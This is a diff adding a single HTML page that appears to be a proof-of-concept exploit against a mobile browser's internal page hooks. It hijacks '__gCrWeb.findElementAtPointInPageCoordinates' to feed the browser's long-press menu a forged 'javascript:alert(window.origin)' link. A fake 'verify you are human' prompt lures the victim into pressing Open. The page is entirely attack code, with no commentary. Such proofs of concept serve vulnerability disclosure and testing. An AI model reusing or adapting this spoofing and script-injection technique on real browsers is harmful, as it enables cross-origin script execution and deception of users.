@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <img style="display:block;margin:0 auto;" width="85px;" src="https://www.google.com/favicon.ico">
+
+    <img width="500px;" style="border:1px solid #000000; display:block;margin:200px auto;" src="https://i.imgur.com/1fDGQky.jpg?1">
+
+    <script type="text/javascript">
+
+      alert("Hold finger on page and press Open to verify you are human.");
+      function redirect() {
+        document.location = "https://www.google.com/favicon.ico";
+      }
+
+      var onlongtouch; 
+      var timer;
+      var touchduration = 1000;
+      
+      function touchstart(e) {
+          if (!timer) {
+              timer = setTimeout(redirect, touchduration);
+          }
+      }
+
+      function touchend() {
+          //stops short touches from firing the event
+          if (timer) {
+              clearTimeout(timer);
+              timer = null;
+          }
+      }
+
+      function findElementHook(requestId, x, y) { 
+        console.log(requestId)
+        window.webkit.messageHandlers.FindElementResultHandler.postMessage({
+          "requestId": requestId,
+          "referrerPolicy": "default",
+          "src": "javascript:alert(window.origin)",
+          "href": "javascript:alert(window.origin)",
+          "innerText": "magic awaits within",
+          "title": "Press Open to Verify"
+        })
+      }
+
+      function setHook() {
+        __gCrWeb['findElementAtPointInPageCoordinates'] = findElementHook
+      }
+
+      document.addEventListener("DOMContentLoaded", function(event) { 
+          window.addEventListener("touchstart", touchstart, false);
+          window.addEventListener("touchend", touchend, false);
+      });
+
+      setTimeout(setHook, 300);
+    </script>
+  </body>
+</html>
